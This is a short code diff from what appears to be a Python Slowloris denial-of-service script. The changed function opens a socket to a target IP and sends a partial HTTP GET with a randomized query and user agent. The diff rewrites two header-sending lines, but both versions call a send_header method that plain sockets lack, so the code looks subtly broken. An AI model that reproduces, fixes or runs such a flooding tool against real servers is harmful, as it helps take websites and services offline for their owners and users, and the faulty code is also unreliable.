@@ -37,8 +37,8 @@ def create_socket(IP, port):
     s.connect((IP, port))
     s.send(f"GET /?{random.randint(1,255)} HTTP/1.1\r\n".encode())
 
-    s.send_header("User-Agent", random.choice(user_agents))
-    s.send_header("Accept-language", "en-US,en,q=0.5")
+    s.send_header(f"User-Agent: {random.choice(user_agents)}\r\n".encode())
+    s.send_header("Accept-language: en-US,en,q=0.5\r\n".encode())
     return s
 
 def slowloris(IP, port, socket_count):
